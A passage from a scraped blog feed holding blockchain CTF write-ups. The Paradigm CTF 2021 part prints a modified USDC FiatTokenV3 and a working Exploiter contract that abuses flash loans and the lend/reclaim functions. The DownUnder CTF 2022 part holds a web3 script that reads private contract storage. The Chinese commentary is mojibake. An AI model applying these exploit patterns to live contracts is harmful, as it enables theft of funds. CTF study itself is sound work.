validBefore,bytes32 nonce)\")\n    bytes32\n        public constant CANCEL_AUTHORIZATION_TYPEHASH = 0x158b0a9edf7a828aad02f63cd515c68ef2f50ba807396f6d12842833a1597429;\n    // = keccak256(\"CancelAuthorization(address authorizer,bytes32 nonce)\")\n\n    enum AuthorizationState &#123; Unused, Used, Canceled &#125;\n\n    /**\n     * @dev authorizer address => nonce => authorization state\n     */\n    mapping(address => mapping(bytes32 => AuthorizationState))\n        private _authorizationStates;\n\n    event AuthorizationUsed(address indexed authorizer, bytes32 indexed nonce);\n    event AuthorizationCanceled(\n        address indexed authorizer,\n        bytes32 indexed nonce\n    );\n\n    /**\n     * @notice Returns the state of an authorization\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @return Authorization state\n     */\n    function authorizationState(address authorizer, bytes32 nonce)\n        external\n        view\n        returns (AuthorizationState)\n    &#123;\n        return _authorizationStates[authorizer][nonce];\n    &#125;\n\n    /**\n     * @notice Verify a signed transfer authorization and execute if valid\n     * @param from          Payer's address (Authorizer)\n     * @param to            Payee's address\n     * @param value         Amount to be transferred\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _transferWithAuthorization(\n        address from,\n        address to,\n        uint256 value,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireValidAuthorization(from, nonce, validAfter, validBefore);\n\n        bytes memory data = abi.encode(\n            TRANSFER_WITH_AUTHORIZATION_TYPEHASH,\n            from,\n            to,\n            value,\n            validAfter,\n            validBefore,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == from,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _markAuthorizationAsUsed(from, nonce);\n        _transfer(from, to, value);\n    &#125;\n\n    /**\n     * @notice Verify a signed authorization for an increase in the allowance\n     * granted to the spender and execute if valid\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param increment     Amount of increase in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _increaseAllowanceWithAuthorization(\n        address owner,\n        address spender,\n        uint256 increment,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireValidAuthorization(owner, nonce, validAfter, validBefore);\n\n        bytes memory data = abi.encode(\n            INCREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH,\n            owner,\n            spender,\n            increment,\n            validAfter,\n            validBefore,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _markAuthorizationAsUsed(owner, nonce);\n        _increaseAllowance(owner, spender, increment);\n    &#125;\n\n    /**\n     * @notice Verify a signed authorization for a decrease in the allowance\n     * granted to the spender and execute if valid\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param decrement     Amount of decrease in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _decreaseAllowanceWithAuthorization(\n        address owner,\n        address spender,\n        uint256 decrement,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireValidAuthorization(owner, nonce, validAfter, validBefore);\n\n        bytes memory data = abi.encode(\n            DECREASE_ALLOWANCE_WITH_AUTHORIZATION_TYPEHASH,\n            owner,\n            spender,\n            decrement,\n            validAfter,\n            validBefore,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _markAuthorizationAsUsed(owner, nonce);\n        _decreaseAllowance(owner, spender, decrement);\n    &#125;\n\n    /**\n     * @notice Verify a signed approval authorization and execute if valid\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param value         Amount of allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _approveWithAuthorization(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireValidAuthorization(owner, nonce, validAfter, validBefore);\n\n        bytes memory data = abi.encode(\n            APPROVE_WITH_AUTHORIZATION_TYPEHASH,\n            owner,\n            spender,\n            value,\n            validAfter,\n            validBefore,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _markAuthorizationAsUsed(owner, nonce);\n        _approve(owner, spender, value);\n    &#125;\n\n    /**\n     * @notice Attempt to cancel an authorization\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function _cancelAuthorization(\n        address authorizer,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        _requireUnusedAuthorization(authorizer, nonce);\n\n        bytes memory data = abi.encode(\n            CANCEL_AUTHORIZATION_TYPEHASH,\n            authorizer,\n            nonce\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == authorizer,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _authorizationStates[authorizer][nonce] = AuthorizationState.Canceled;\n        emit AuthorizationCanceled(authorizer, nonce);\n    &#125;\n\n    /**\n     * @notice Check that an authorization is unused\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     */\n    function _requireUnusedAuthorization(address authorizer, bytes32 nonce)\n        private\n        view\n    &#123;\n        require(\n            _authorizationStates[authorizer][nonce] ==\n                AuthorizationState.Unused,\n            \"FiatTokenV2: authorization is used or canceled\"\n        );\n    &#125;\n\n    /**\n     * @notice Check that authorization is valid\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     */\n    function _requireValidAuthorization(\n        address authorizer,\n        bytes32 nonce,\n        uint256 validAfter,\n        uint256 validBefore\n    ) private view &#123;\n        require(\n            now > validAfter,\n            \"FiatTokenV2: authorization is not yet valid\"\n        );\n        require(now &lt; validBefore, \"FiatTokenV2: authorization is expired\");\n        _requireUnusedAuthorization(authorizer, nonce);\n    &#125;\n\n    /**\n     * @notice Mark an authorization as used\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     */\n    function _markAuthorizationAsUsed(address authorizer, bytes32 nonce)\n        private\n    &#123;\n        _authorizationStates[authorizer][nonce] = AuthorizationState.Used;\n        emit AuthorizationUsed(authorizer, nonce);\n    &#125;\n&#125;\n\n// File: contracts/v2/Permit.sol\n\n/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n\n/**\n * @title Permit\n * @notice An alternative to approveWithAuthorization, provided for\n * compatibility with the draft EIP2612 proposed by Uniswap.\n * @dev Differences:\n * - Uses sequential nonce, which restricts transaction submission to one at a\n *   time, or else it will revert\n * - Has deadline (= validBefore - 1) but does not have validAfter\n * - Doesn't have a way to change allowance atomically to prevent ERC20 multiple\n *   withdrawal attacks\n */\nabstract contract Permit is AbstractFiatTokenV2, EIP712Domain &#123;\n    bytes32\n        public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n    // = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\")\n\n    mapping(address => uint256) private _permitNonces;\n\n    /**\n     * @notice Nonces for permit\n     * @param owner Token owner's address (Authorizer)\n     * @return Next nonce\n     */\n    function nonces(address owner) external view returns (uint256) &#123;\n        return _permitNonces[owner];\n    &#125;\n\n    /**\n     * @notice Verify a signed approval permit and execute if valid\n     * @param owner     Token owner's address (Authorizer)\n     * @param spender   Spender's address\n     * @param value     Amount of allowance\n     * @param deadline  The time at which this expires (unix time)\n     * @param v         v of the signature\n     * @param r         r of the signature\n     * @param s         s of the signature\n     */\n    function _permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal &#123;\n        require(deadline >= now, \"FiatTokenV2: permit is expired\");\n\n        bytes memory data = abi.encode(\n            PERMIT_TYPEHASH,\n            owner,\n            spender,\n            value,\n            _permitNonces[owner]++,\n            deadline\n        );\n        require(\n            EIP712.recover(DOMAIN_SEPARATOR, v, r, s, data) == owner,\n            \"FiatTokenV2: invalid signature\"\n        );\n\n        _approve(owner, spender, value);\n    &#125;\n&#125;\n\n// File: contracts/v2/FiatTokenV2.sol\n\n/**\n * License: MIT\n *\n * Copyright (c) 2018-2020 CENTRE SECZ\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n */\n\n\n/**\n * @title FiatToken V2\n * @notice ERC20 Token backed by fiat reserves, version 2\n */\ncontract FiatTokenV2 is FiatTokenV1_1, GasAbstraction, Permit &#123;\n    bool internal _initializedV2;\n\n    /**\n     * @notice Initialize V2 contract\n     * @dev When upgrading to V2, this function must also be invoked by using\n     * upgradeToAndCall instead of upgradeTo, or by calling both from a contract\n     * in a single transaction.\n     * @param newName   New token name\n     */\n    function initializeV2(string calldata newName) external &#123;\n        require(\n            !_initializedV2,\n            \"FiatTokenV2: contract is already initialized\"\n        );\n        name = newName;\n        DOMAIN_SEPARATOR = EIP712.makeDomainSeparator(newName, \"2\");\n        _initializedV2 = true;\n    &#125;\n\n    /**\n     * @notice Increase the allowance by a given increment\n     * @param spender   Spender's address\n     * @param increment Amount of increase in allowance\n     * @return True if successful\n     */\n    function increaseAllowance(address spender, uint256 increment)\n        external\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(spender)\n        returns (bool)\n    &#123;\n        _increaseAllowance(msg.sender, spender, increment);\n        return true;\n    &#125;\n\n    /**\n     * @notice Decrease the allowance by a given decrement\n     * @param spender   Spender's address\n     * @param decrement Amount of decrease in allowance\n     * @return True if successful\n     */\n    function decreaseAllowance(address spender, uint256 decrement)\n        external\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(spender)\n        returns (bool)\n    &#123;\n        _decreaseAllowance(msg.sender, spender, decrement);\n        return true;\n    &#125;\n\n    /**\n     * @notice Execute a transfer with a signed authorization\n     * @param from          Payer's address (Authorizer)\n     * @param to            Payee's address\n     * @param value         Amount to be transferred\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function transferWithAuthorization(\n        address from,\n        address to,\n        uint256 value,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(from) notBlacklisted(to) &#123;\n        _transferWithAuthorization(\n            from,\n            to,\n            value,\n            validAfter,\n            validBefore,\n            nonce,\n            v,\n            r,\n            s\n        );\n    &#125;\n\n    /**\n     * @notice Update allowance with a signed authorization\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param value         Amount of allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function approveWithAuthorization(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(owner) notBlacklisted(spender) &#123;\n        _approveWithAuthorization(\n            owner,\n            spender,\n            value,\n            validAfter,\n            validBefore,\n            nonce,\n            v,\n            r,\n            s\n        );\n    &#125;\n\n    /**\n     * @notice Increase allowance with a signed authorization\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param increment     Amount of increase in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function increaseAllowanceWithAuthorization(\n        address owner,\n        address spender,\n        uint256 increment,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(owner) notBlacklisted(spender) &#123;\n        _increaseAllowanceWithAuthorization(\n            owner,\n            spender,\n            increment,\n            validAfter,\n            validBefore,\n            nonce,\n            v,\n            r,\n            s\n        );\n    &#125;\n\n    /**\n     * @notice Decrease allowance with a signed authorization\n     * @param owner         Token owner's address (Authorizer)\n     * @param spender       Spender's address\n     * @param decrement     Amount of decrease in allowance\n     * @param validAfter    The time after which this is valid (unix time)\n     * @param validBefore   The time before which this is valid (unix time)\n     * @param nonce         Unique nonce\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function decreaseAllowanceWithAuthorization(\n        address owner,\n        address spender,\n        uint256 decrement,\n        uint256 validAfter,\n        uint256 validBefore,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(owner) notBlacklisted(spender) &#123;\n        _decreaseAllowanceWithAuthorization(\n            owner,\n            spender,\n            decrement,\n            validAfter,\n            validBefore,\n            nonce,\n            v,\n            r,\n            s\n        );\n    &#125;\n\n    /**\n     * @notice Attempt to cancel an authorization\n     * @dev Works only if the authorization is not yet used.\n     * @param authorizer    Authorizer's address\n     * @param nonce         Nonce of the authorization\n     * @param v             v of the signature\n     * @param r             r of the signature\n     * @param s             s of the signature\n     */\n    function cancelAuthorization(\n        address authorizer,\n        bytes32 nonce,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused &#123;\n        _cancelAuthorization(authorizer, nonce, v, r, s);\n    &#125;\n\n    /**\n     * @notice Update allowance with a signed permit\n     * @param owner       Token owner's address (Authorizer)\n     * @param spender     Spender's address\n     * @param value       Amount of allowance\n     * @param deadline    Expiration time, seconds since the epoch\n     * @param v           v of the signature\n     * @param r           r of the signature\n     * @param s           s of the signature\n     */\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external whenNotPaused notBlacklisted(owner) notBlacklisted(spender) &#123;\n        _permit(owner, spender, value, deadline, v, r, s);\n    &#125;\n\n    /**\n     * @notice Internal function to increase the allowance by a given increment\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @param increment Amount of increase\n     */\n    function _increaseAllowance(\n        address owner,\n        address spender,\n        uint256 increment\n    ) internal override &#123;\n        _approve(owner, spender, allowed[owner][spender].add(increment));\n    &#125;\n\n    /**\n     * @notice Internal function to decrease the allowance by a given decrement\n     * @param owner     Token owner's address\n     * @param spender   Spender's address\n     * @param decrement Amount of decrease\n     */\n    function _decreaseAllowance(\n        address owner,\n        address spender,\n        uint256 decrement\n    ) internal override &#123;\n        _approve(\n            owner,\n            spender,\n            allowed[owner][spender].sub(\n                decrement,\n                \"ERC20: decreased allowance below zero\"\n            )\n        );\n    &#125;\n&#125;\n\n/**\n * @title FiatToken V3\n * @notice ERC20 Token backed by fiat reserves, version 3\n */\ncontract FiatTokenV3 is FiatTokenV2 &#123;\n    // ensure we start on a new storage slot just in case\n    uint private _gap;\n\n    bool internal _initializedV3;\n\n    mapping(address => mapping(address => uint256)) private _loans;\n\n    /**\n     * @notice Initialize V3 contract\n     * @dev When upgrading to V3, this function must also be invoked by using\n     * upgradeToAndCall instead of upgradeTo, or by calling both from a contract\n     * in a single transaction.\n     */\n    function initializeV3() external &#123;\n        require(\n            !_initializedV3,\n            \"FiatTokenV3: contract is already initialized\"\n        );\n        DOMAIN_SEPARATOR = EIP712.makeDomainSeparator(name, \"3\");\n        _initializedV3 = true;\n    &#125;\n\n    /**\n     * @notice Lends some tokens to the specified address\n     * @param to        Recipient's address\n     * @param amount    Loan amount\n     * @return True if successful\n     */\n    function lend(address to, uint amount)\n        external\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(to)\n        returns (bool)\n    &#123;\n        _loans[msg.sender][to] = _loans[msg.sender][to].add(amount);\n\n        _transfer(msg.sender, to, amount);\n        return true;\n    &#125;\n\n    /**\n     * @notice Reclaims previously lent tokens\n     * @param from      The account to which tokens were lent\n     * @param amount    Reclaim amount\n     * @return True if successful\n     */\n    function reclaim(address from, uint amount)\n        external\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(from)\n        returns (bool)\n    &#123;\n        _loans[msg.sender][from] = _loans[msg.sender][from].sub(amount, \"FiatTokenV3: decreased loans below zero\");\n\n        _transfer(from, msg.sender, amount);\n        return true;\n    &#125;\n&#125;\n\nabstract contract ERC20Like &#123;\n    function balanceOf(address user) external virtual view returns (uint);\n&#125;\n\nabstract contract FiatTokenProxyLike is ERC20Like &#123;\n    function changeAdmin(address newAdmin) external virtual;\n\n    function upgradeTo(address newImplementation) external virtual;\n&#125;\n\ncontract Setup &#123;\n    FiatTokenProxyLike private constant USDC = FiatTokenProxyLike(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n\n    function upgrade() external &#123;\n        FiatTokenV3 v3 = new FiatTokenV3();\n        v3.initialize(\"\", \"\", \"\", 0, address(0x01), address(0x01), address(0x01), address(0x01));\n        v3.initializeV2(\"\");\n        v3.initializeV3();\n\n        USDC.upgradeTo(address(v3));\n        USDC.changeAdmin(0x807a96288A1A408dBC13DE2b1d087d10356395d2);\n        FiatTokenV3(address(USDC)).initializeV3();\n    &#125;\n\n    function isSolved() external view returns (bool) &#123;\n        return USDC.balanceOf(address(this)) > 200_000_000e6;\n    &#125;\n&#125;\n\n\n\nAnalyse\nClick to see flow chart\n\n\n\nçœ‹ä¸€ä¸‹åˆçº¦çš„å€Ÿè´·åŠŸèƒ½ï¼Œå¾ˆå¥½ç†è§£\nfunction lend(address to, uint amount) external returns (bool) &#123;\n    _loans[msg.sender][to] = _loans[msg.sender][to].add(amount);\n    _transfer(msg.sender, to, amount);\n    return true;\n&#125;\n\nfunction reclaim(address from, uint amount) external returns (bool) &#123;\n    _loans[msg.sender][from] = _loans[msg.sender][from].sub(amount, \"FiatTokenV3: decreased loans below zero\");\n    _transfer(from, msg.sender, amount);\n    return true;\n&#125;\n\nå¯ä»¥æŒ‡å®štoåœ°å€è¿›è¡Œå€Ÿå‡ºåˆå¯ä»¥ç›´æŽ¥è¿›è¡Œè¿˜æ¬¾æ“ä½œï¼ˆåœ¨toåœ°å€æœ‰tokençš„æƒ…å†µä¸‹ï¼‰ï¼Œå€Ÿè´·ä¸¤ä¸ªæ“ä½œéƒ½é›†ä¸­åœ¨å•æ–¹é¢ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å‡ºçŽ°å®‰å…¨é—®é¢˜\nsuch asï¼š\né¦–å…ˆé€šè¿‡flash loanåŠŸèƒ½å€Ÿå‡º200_000_000e6çš„tokenï¼Œæˆ‘ä»¬åœ¨å°†å…¨éƒ¨tokeå€Ÿç»™flash loançš„æ¥æºåˆçº¦ï¼Œå›žè°ƒå‡½æ•°ä¸ºç©ºæˆ–è€…ç›´æŽ¥reclaimï¼Œè‡ªç„¶å°±ä¼šé€šè¿‡flashloançš„åˆ¤æ–­ï¼Œä¹‹åŽæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨reclaimå‡½æ•°æ°é’±äº†ï¼åœ¨transferç»™FiatToken v3ï¼Œé€šå…³ï¼\nAttackcontract Exploiter &#123;\n    FiatTokenV3 public constant USDC = FiatTokenV3(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IWETH9 public constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    IUniswapV2Pair public constant USDCWETH = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);\n    \n    function swap(uint256 amount) external payable &#123;\n        uint256 value = msg.value;\n        WETH.deposit&#123;value: value&#125;();\n        WETH.transfer(address(USDCWETH), value);\n        USDCWETH.swap(amount, 0, address(this), \"\");\n    &#125;\n    \n    function exploit(IUniswapV2Pair pair, uint256 amount0, uint256 amount1) external &#123;\n        pair.swap(amount0, amount1, address(this), \"0x123456\");\n        uint256 paid = (amount0 + amount1) * 1004 / 1000;\n        USDC.reclaim(address(pair), paid);\n    &#125;\n    \n    function uniswapV2Call(address, uint amount0, uint amount1, bytes calldata) external &#123;\n        uint256 topay = (amount0 + amount1) * 1004 / 1000;\n        USDC.lend(msg.sender, topay);\n    &#125;\n    \n    function withdraw(address to, uint256 amount) external &#123;\n        USDC.transfer(to, amount);\n    &#125;\n&#125;\n\n","slug":"Paradigm  CTF 2021","date":"2022-10-15T12:42:45.830Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"37d952c359458cb6532fc36cd0258d93","title":"Down Under CTF","content":"DownUnder ctf 2022-blockchainé¢˜è§£\n\n\nSolve Meä¸€é“ç­¾åˆ°é¢˜ï¼Œæ²¡ä»€ä¹ˆéš¾åº¦ï¼Œè°ƒç”¨æŒ‡å®šå‡½æ•°å³å¯\nfunction solveChallenge() external &#123;\n        isSolved = true;\n    &#125;\n\nSecret and Ephemeralç¨å¾®æœ‰äº†ç‚¹éš¾åº¦\nCode// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @title Secret And Ephemeral\n * @author Blue Alder (https://duc.tf)\n **/\n\ncontract SecretAndEphemeral &#123;\n    address private owner;\n    int256 public seconds_in_a_year = 60 * 60 * 24 * 365;\n    string word_describing_ductf = \"epic\";\n    string private not_yours;\n    mapping(address => uint) public cool_wallet_addresses;\n\n    bytes32 public spooky_hash; //\n\n    constructor(string memory _not_yours, uint256 _secret_number) &#123;\n        not_yours = _not_yours;\n        spooky_hash = keccak256(abi.encodePacked(not_yours, _secret_number, msg.sender));\n    &#125;\n\n    function giveTheFunds() payable public &#123;\n        require(msg.value > 0.1 ether);\n        // Thankyou for your donation\n        cool_wallet_addresses[msg.sender] += msg.value;\n    &#125;\n\n    function retrieveTheFunds(string memory secret, uint256 secret_number, address _owner_address) public &#123;\n        bytes32 userHash = keccak256(abi.encodePacked(secret, secret_number, _owner_address));\n\n        require(userHash == spooky_hash, \"Somethings wrong :(\");\n\n        // User authenticated, sending funds\n        uint256 balance = address(this).balance;\n        payable(msg.sender).transfer(balance);\n    &#125;\n&#125;\n\nAnalyseç®€å•åˆ†æžä¸€ä¸‹ï¼Œé¢˜ç›®è¦ç‚¹å°±æ˜¯èŽ·å¾—not_yoursï¼Œ_secret_numberä»¥åŠcreaterï¼Œå…¶ä¸­not_yourså¥½èŽ·å¾—ï¼Œé€šè¿‡å˜é‡å­˜å‚¨è§„åˆ™è¿›è¡ŒæŸ¥è¯¢å³å¯ï¼Œéš¾ç‚¹æ˜¯_secret_numberä»¥åŠcreaterï¼Œè¿™ä¸¤ä¸ªæˆ‘ä»¬é€šè¿‡æž„é€ dataè¿›è¡Œåˆ†æž\nfrom webbrowser import get\nfrom web3 import Web3,HTTPProvider\nw3=Web3(HTTPProvider('https://blockchain-secretandephemeral-0b6c2a4599eb7832-eth.2022.ductf.dev:443'))\nblock=[]\nnumber=[]\ndef getlongp(i):\n    return i[2:].rjust(64,'0')\n\ndef getposition(i):\n    return int(Web3.keccak(hexstr=i).hex(),16)\n\nposition=getposition(getlongp('0x3'))\nprint(w3.eth.getStorageAt('0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8',position))\nprint(w3.eth.getStorageAt('0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8',position+1))\n\nfor i in range(0,5):\n    s=w3.eth.getBlockTransactionCount(i)\n    if s!=0:\n        block.append(i)\n        number.append(s)\nfor x in (0,len(block)-1):\n    print('No.',block[x],'have',number[x],'transactions')\n\nfor p in range(0,len(block)):\n    for o in range(0,number[p]):\n        print(w3.toJSON(w3.eth.getTransactionByBlock(block[p],o)))\n\nprint(w3.eth.getBalance(''))\n\n\nèŽ·å¾—ç»“æžœå¦‚ä¸‹\nb'so anyways i just started blasti'\nNo. 3 have 2 transactions\nNo. 4 have 1 transactions\n&#123;\"blockHash\": \"0xa3868886196f92397a0093054763d0c8ea6685752e0d7dec64acb338be74b14b\", \"blockNumber\": 3, \"from\": \"0x7BCF8A237e5d8900445C148FC2b119670807575b\", \"gas\": 21000, \"gasPrice\": 1000000000, \"hash\": \"0x42ff5b306690a58eecec489d86a9964d726d9bbe214679dc0606faf339c7c072\", \"input\": \"0x\", \"nonce\": 0, \"to\": \"0x9acACff3E22Bfdd49aD9dA6Ec8d70C1b2a2f8B08\", \"transactionIndex\": 0, \"value\": 1000000000000000000, \"type\": \"0x0\", \"chainId\": \"0x7a69\", \"v\": 62709, \"r\": \"0x1edab133e2cb18ca248c320bd7a0f18540185c957a74a737198edb437be44fda\", \"s\": \"0x198980c66e377505607a4e75321c73816b5397d25a4fdb2c457acadbca158670\"&#125;\n&#123;\"blockHash\": \"0xa3868886196f92397a0093054763d0c8ea6685752e0d7dec64acb338be74b14b\", \"blockNumber\": 3, \"from\": \"0x7BCF8A237e5d8900445C148FC2b119670807575b\", \"gas\": 391467, \"gasPrice\": 1000000000, \"hash\": \"0xd3383dd590ea361847180c3616faed3a091c3e8f3296771e0c2844b2746d408f\", \"input\": \"0x6301e1338060015560c060405260046080908152636570696360e01b60a05260029061002b908261013c565b5034801561003857600080fd5b506040516106fd3803806106fd833981016040819052610057916101fb565b6003610063838261013c565b506003813360405160200161007a939291906102ca565b60405160208183030381529060405280519060200120600581905550505061035a565b634e487b7160e01b600052604160045260246000fd5b600181811c908216806100c757607f821691505b6020821081036100e757634e487b7160e01b600052602260045260246000fd5b50919050565b601f82111561013757600081815260208120601f850160051c810160208610156101145750805b601f850160051c820191505b8181101561013357828155600101610120565b5050505b505050565b81516001600160401b038111156101555761015561009d565b6101698161016384546100b3565b846100ed565b602080601f83116001811461019e57600084156101865750858301515b600019600386901b1c1916600185901b178555610133565b600085815260208120601f198616915b828110156101cd578886015182559484019460019091019084016101ae565b50858210156101eb5787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b6000806040838503121561020e57600080fd5b82516001600160401b038082111561022557600080fd5b818501915085601f83011261023957600080fd5b81518181111561024b5761024b61009d565b604051601f8201601f19908116603f011681019083821181831017156102735761027361009d565b8160405282815260209350888484870101111561028f57600080fd5b600091505b828210156102b15784820184015181830185015290830190610294565b6000928101840192909252509401519395939450505050565b60008085546102d8816100b3565b600182811680156102f0576001811461030557610334565b60ff1984168752821515830287019450610334565b8960005260208060002060005b8581101561032b5781548a82